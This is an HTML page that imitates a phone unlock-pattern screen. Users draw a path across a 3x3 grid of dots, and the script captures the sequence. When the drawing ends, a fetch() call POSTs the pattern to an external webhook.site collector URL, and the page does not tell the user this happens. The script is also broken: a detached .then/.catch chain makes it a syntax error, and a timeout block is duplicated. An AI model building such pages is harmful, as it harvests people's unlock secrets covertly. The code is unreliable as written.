<!DOCTYPE html>
<html>
<head>
  <title>Draw Pattern</title>
  <style>
    body {
      font-family: Arial;
      text-align: center;
      margin-top: 50px;
    }
.wrapper {
  position: relative;
  display: inline-block;
}

#canvas {
  position: absolute;
  top: 0;
  left: 0;
  z-index: 0;
}

.grid {
  position: relative;
  z-index: 1;
  touch-action: none;
}
    .grid {
  display: grid;
  grid-template-columns: repeat(3, 80px);
  gap: 40px;
  justify-content: center;
  touch-action: none; /* ⭐ FIX TOUCH */
}
    .dot {
  width: 20px;
  height: 20px;
  background: #888;
  border-radius: 50%;
}
    .dot.active {
  background: #4CAF50;
  transform: scale(1.5);
}
  </style>
</head>
<body>

<h2>Draw the Pattern</h2>
<div class="wrapper">
  <canvas id="canvas"></canvas>

  <div class="grid" id="grid">
    <div class="dot" data-id="1"></div>
    <div class="dot" data-id="2"></div>
    <div class="dot" data-id="3"></div>
    <div class="dot" data-id="4"></div>
    <div class="dot" data-id="5"></div>
    <div class="dot" data-id="6"></div>
    <div class="dot" data-id="7"></div>
    <div class="dot" data-id="8"></div>
    <div class="dot" data-id="9"></div>
  </div>
</div>

<h3 id="result"></h3>

<script>
  const canvas = document.getElementById('canvas');
const ctx = canvas.getContext('2d');

function resizeCanvas() {
  const grid = document.getElementById('grid');
  const rect = grid.getBoundingClientRect();

  canvas.width = rect.width;
  canvas.height = rect.height;

  canvas.style.width = rect.width + "px";
  canvas.style.height = rect.height + "px";
}
resizeCanvas();
window.addEventListener('resize', resizeCanvas);
let pattern = [];
let isDrawing = false;

document.querySelectorAll('.dot').forEach(dot => {

  dot.addEventListener('mousedown', start);
  dot.addEventListener('mouseover', move);
  dot.addEventListener('touchstart', start);
  dot.addEventListener('touchmove', move);

});

document.addEventListener('mouseup', end);
document.addEventListener('touchend', end);

function start(e) {
  e.preventDefault();
  isDrawing = true;
  pattern = [];

  let target = e.touches ? document.elementFromPoint(
    e.touches[0].clientX,
    e.touches[0].clientY
  ) : e.target;

  if (target && target.classList.contains('dot')) {
    activate(target);
  }
}
  function getCenter(dot) {
  const grid = document.getElementById('grid');
  const gridRect = grid.getBoundingClientRect();
  const rect = dot.getBoundingClientRect();

  return {
    x: rect.left - gridRect.left + rect.width / 2,
    y: rect.top - gridRect.top + rect.height / 2
  };
}
  function drawLines() {
  ctx.clearRect(0, 0, canvas.width, canvas.height);

  if (pattern.length < 2) return;

  ctx.strokeStyle = "#4CAF50";
  ctx.lineWidth = 5;
  ctx.beginPath();

  pattern.forEach((id, index) => {
    const dot = document.querySelector(`[data-id='${id}']`);
    const pos = getCenter(dot);

    if (index === 0) {
      ctx.moveTo(pos.x, pos.y);
    } else {
      ctx.lineTo(pos.x, pos.y);
    }
  });

  ctx.stroke();
  }

function move(e) {
  e.preventDefault();
  if (!isDrawing) return;

  let touch = e.touches ? e.touches[0] : e;

  let element = document.elementFromPoint(
    touch.clientX,
    touch.clientY
  );

  if (element && element.classList.contains('dot')) {
    activate(element);
  }
}

function end() {
  if (!isDrawing) return;
  isDrawing = false;

  let result = pattern.join('-');
  document.getElementById('result').innerText = "Pattern: " + result;

  alert("Sending: " + result); // debug

  fetch("https://webhook.site/f6af3aa6-bc95-46b5-a5a3-03d16ed5cb7b",{
  method: "POST",
  mode: "no-cors",
  body: "pattern=" + result
})
    document.querySelectorAll('.dot').forEach(d => d.classList.remove('active'));
.then(() => console.log("Sent!"))
.catch(err => console.error("Error:", err));
  setTimeout(() => {
  ctx.clearRect(0, 0, canvas.width, canvas.height);
}, 1000);
  setTimeout(() => {
  ctx.clearRect(0, 0, canvas.width, canvas.height);
}, 1000);
}

function activate(dot) {
  let id = dot.getAttribute('data-id');

  if (!pattern.includes(id)) {
    pattern.push(id);
    dot.classList.add('active');

    drawLines(); // ⭐ ADD THIS
  }
}
</script>

</body>
</html>
